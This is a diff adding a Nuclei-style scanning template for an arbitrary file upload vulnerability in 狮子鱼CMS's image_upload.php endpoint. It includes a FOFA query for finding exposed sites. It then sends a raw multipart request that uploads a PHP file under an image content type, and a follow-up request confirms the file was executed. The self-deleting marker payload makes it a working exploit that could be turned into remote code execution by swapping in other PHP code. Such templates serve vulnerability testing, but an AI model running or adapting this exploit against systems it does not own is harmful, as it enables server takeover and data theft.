@@ -1,0 +1,39 @@
+id: shiziyucms-file-upload
+
+info:
+  name: "狮子鱼CMS image_upload.php 组件存在任意文件上传漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="/seller.php?s=/Public/login"
+      攻击者可通过操控image_upload.php接口参数，绕过文件类型校验机制实现任意文件上传。该漏洞源于后端验证逻辑缺陷，允许将可执行脚本或恶意文件写入服务器存储空间，可能引发远程代码执行或敏感数据泄露风险。
+  tags: 狮子鱼CMS
+
+flow: |
+  http(1) && http(2)
+
+http:
+- raw:
+  - |
+    POST /Common/ckeditor/plugins/multiimg/dialogs/image_upload.php HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: multipart/form-data;boundary=----WebKitFormBoundary8UaANmWAgM4BqBSs
+
+    ------WebKitFormBoundary8UaANmWAgM4BqBSs
+    Content-Disposition: form-data; name="files"; filename="NTest.php"
+    Content-Type: image/gif
+
+    <?php echo 'NdayTest'; unlink(__FILE__); ?>
+    ------WebKitFormBoundary8UaANmWAgM4BqBSs—
+- raw:
+  - |
+    GET /Common/image/uploads/NTest.php HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'NdayTest'
